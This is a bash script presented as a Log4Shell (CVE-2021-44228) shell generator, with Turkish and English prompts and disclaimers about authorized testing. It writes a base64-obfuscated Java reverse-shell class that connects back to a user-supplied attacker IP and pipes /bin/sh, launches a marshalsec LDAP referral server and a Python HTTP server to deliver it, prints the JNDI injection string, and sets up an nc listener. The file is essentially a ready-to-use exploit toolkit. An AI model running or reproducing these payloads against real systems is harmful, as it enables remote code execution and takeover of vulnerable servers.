#!/bin/bash
# RealRadioactive log4j Shell Generator
# Coded and edit by: https://github.com/Realradioactive


banner() {
printf " \n"
printf " \n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\e[0m \n"
printf "\e[1;36m  \n"

cat banner.txt
printf " \e[0m \n"
printf "\e[1;91m        RealRadioactive log4j Shell Generator,    \e[0m \n"
printf "\e[1;91m        If you came here for Log4Shell/CVE-2021-44228,you are in the right place  \e[0m \n"
printf " \n"
printf "\e[1;32m        RealRadioactive log4j Shell Generator \e[0m \n"
printf "\e[1;32m        Coded and edit by: https://github.com/Realradioactive  \e[0m \n"
printf "\e[1;32m        RealRadioactive -poztiron- log4j shell programi \e[0m \n"
printf "\e[1;32m        yaratici: https://github.com/Realradioactive  \e[0m \n"
printf "\e[1;32m        Bu arac ile Log4Shell/CVE-2021-44228 zafiyeti somurulerek reverse shell almak amaci ile yazilmıstir.Lutfen araci yalnizca local testler icin kullaniniz. --->Ozel RCE komutlari icin Exploit.java icerigini degistirebilirsiniz ama o zaman bu programi kullanamaz manuel olarak islem yapmak zorundasiniz.\e[0m \n"
printf "\e[1;91m        Bu program yalnızca pentest ve veya güvenlik testleri icin yazilmistir. onceden izin alinmamis sistemlere saldiri veya güvenlik testi disinda kullanimi yasa disidir.      \e[0m \n"

printf "\n"


}



java() {



read -p -$'\n\e[1;92m[+]\e[1;92m Type ip for reverse acceptance -->reverseshell in baglanacagi ip yi gir:\e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
shell_ip=$custom_ip


read -p$'\n\e[1;92m[+]\e[1;92m TType port for reverse acceptance -->reverseshell in baglanacagi port u gir:\e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
shell_port=$custom_port



echo -en "aW1wb3J0IGphdmEuaW8uSU9FeGNlcHRpb247CmltcG9ydCBqYXZhLmlvLklucHV0U3RyZWFtOwppbXBvcnQgamF2YS5pby5PdXRwdXRTdHJlYW07CmltcG9ydCBqYXZhLm5ldC5Tb2NrZXQ7CgpwdWJsaWMgY2xhc3MgRXhwbG9pdCB7CgogICAgcHVibGljIEV4cGxvaXQoKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTdHJpbmcgaG9zdD0i"|base64 -d >Exploit.java
echo -en $shell_ip >>Exploit.java
echo -en "IjsKICAgICAgICBpbnQgcG9ydD0="|base64 -d>>Exploit.java
echo -en $shell_port>>Exploit.java
echo -en "OwogICAgICAgIFN0cmluZyBjbWQ9Ii9iaW4vc2giOwogICAgICAgIFByb2Nlc3MgcD1uZXcgUHJvY2Vzc0J1aWxkZXIoY21kKS5yZWRpcmVjdEVycm9yU3RyZWFtKHRydWUpLnN0YXJ0KCk7CiAgICAgICAgU29ja2V0IHM9bmV3IFNvY2tldChob3N0LHBvcnQpOwogICAgICAgIElucHV0U3RyZWFtIHBpPXAuZ2V0SW5wdXRTdHJlYW0oKSwKICAgICAgICAgICAgcGU9cC5nZXRFcnJvclN0cmVhbSgpLAogICAgICAgICAgICBzaT1zLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgT3V0cHV0U3RyZWFtIHBvPXAuZ2V0T3V0cHV0U3RyZWFtKCksc289cy5nZXRPdXRwdXRTdHJlYW0oKTsKICAgICAgICB3aGlsZSghcy5pc0Nsb3NlZCgpKSB7CiAgICAgICAgICAgIHdoaWxlKHBpLmF2YWlsYWJsZSgpPjApCiAgICAgICAgICAgICAgICBzby53cml0ZShwaS5yZWFkKCkpOwogICAgICAgICAgICB3aGlsZShwZS5hdmFpbGFibGUoKT4wKQogICAgICAgICAgICAgICAgc28ud3JpdGUocGUucmVhZCgpKTsKICAgICAgICAgICAgd2hpbGUoc2kuYXZhaWxhYmxlKCk+MCkKICAgICAgICAgICAgICAgIHBvLndyaXRlKHNpLnJlYWQoKSk7CiAgICAgICAgICAgIHNvLmZsdXNoKCk7CiAgICAgICAgICAgIHBvLmZsdXNoKCk7CiAgICAgICAgICAgIFRocmVhZC5zbGVlcCg1MCk7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBwLmV4aXRWYWx1ZSgpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKXsKICAgICAgICAgICAgfQogICAgICAgIH07CiAgICAgICAgcC5kZXN0cm95KCk7CiAgICAgICAgcy5jbG9zZSgpOwogICAgfQp9"|base64 -d>>Exploit.java


read -p -$'\n\e[1;92m[+]\e[1;92m Type server ip for web server -->Server için ip girin ornegin 192.168.1.20:\e[0m' cserver_ip
if [[ -z "$cserver_ip" ]]; then
exit 1
fi
server_ip=$cserver_ip

read -p -$'\n\e[1;92m[+]\e[1;92m Type port for web server -->Serverin kurulacagi port u girin:\e[0m' cserver_port
if [[ -z "$cserver_port" ]]; then
exit 1
fi
server_port=$cserver_port


#/bin/bash jvc.sh


echo -en "IyEvYmluL2Jhc2gKIyBSZWFsUmFkaW9hY3RpdmUgbG9nNGogU2hlbGwgR2VuZXJhdG9yCiMgQ29kZWQgYW5kIGVkaXQgYnk6IGh0dHBzOi8vZ2l0aHViLmNvbS9SZWFscmFkaW9hY3RpdmUK"|base64 -d >log4jserver.sh
echo  " ">>log4jserver.sh
echo  "ZWNobyAic2VydmVyIGlwOiI="|base64 -d >>log4jserver.sh
echo -en $server_ip>>log4jserver.sh
echo  " ">>log4jserver.sh
echo "ZWNobyAic2VydmVyIHBvcnQ6Ig=="|base64 -d >>log4jserver.sh
echo -en $server_port>>log4jserver.sh
echo  " ">>log4jserver.sh
echo -en "amF2YSAtY3AgdGFyZ2V0L21hcnNoYWxzZWMtMC4wLjMtU05BUFNIT1QtYWxsLmphciBtYXJzaGFsc2VjLmpuZGkuTERBUFJlZlNlcnZlciAiaHR0cDovLw=="|base64 -d >>log4jserver.sh
echo -en $server_ip>>log4jserver.sh
echo -en "Og=="|base64 -d>>log4jserver.sh
echo -en $server_port>>log4jserver.sh
echo -en "LyNFeHBsb2l0Ig=="|base64 -d >>log4jserver.sh
echo  " ">>log4jserver.sh



read -p $'\e[1;32m  Setup docker vuln web server lab? Y or N \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
xterm -e bash -c "/bin/bash setuptestmachine.sh"
fi


echo "-------------------------------------------------"
echo "   "
echo -en " [+++] Attack code:"
echo -en "JHtqbmRpOmxkYXA6Ly8="|base64 -d
echo -en $server_ip
echo -en "Og=="|base64 -d
echo -en "1389/Exploit}"
echo "   "
echo "-------------------------------------------------"


echo "IyEvYmluL2Jhc2gKIyBSZWFsUmFkaW9hY3RpdmUgbG9nNGogU2hlbGwgR2VuZXJhdG9yCiMgQ29kZWQgYW5kIGVkaXQgYnk6IGh0dHBzOi8vZ2l0aHViLmNvbS9SZWFscmFkaW9hY3RpdmUK"|base64 -d >lissen.sh
echo -en "bmMgLWx2cCA="|base64 -d>>lissen.sh
echo -en $shell_port >>lissen.sh

echo "IyEvYmluL2Jhc2gKIyBSZWFsUmFkaW9hY3RpdmUgbG9nNGogU2hlbGwgR2VuZXJhdG9yCiMgQ29kZWQgYW5kIGVkaXQgYnk6IGh0dHBzOi8vZ2l0aHViLmNvbS9SZWFscmFkaW9hY3RpdmUK"|base64 -d >pythonserver.sh

echo -en "cHl0aG9uMyAtbSBodHRwLnNlcnZlciA="|base64 -d >>pythonserver.sh
echo $server_port >>pythonserver.sh

xterm -e bash -c "/bin/bash jvc.sh" 


read -p $'\e[1;32m  Start vuln web server lab? Y or N  \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
/bin/bash multitab.sh
else
/bin/bash multitabnoserver.sh
fi



#xterm -hold -e bash -c "/bin/bash log4jserver.sh" 
#xterm -hold -e bash -c "/bin/bash pythonserver.sh" 
#xterm -hold -e bash -c "/bin/bash lissen.sh"




}




banner
java



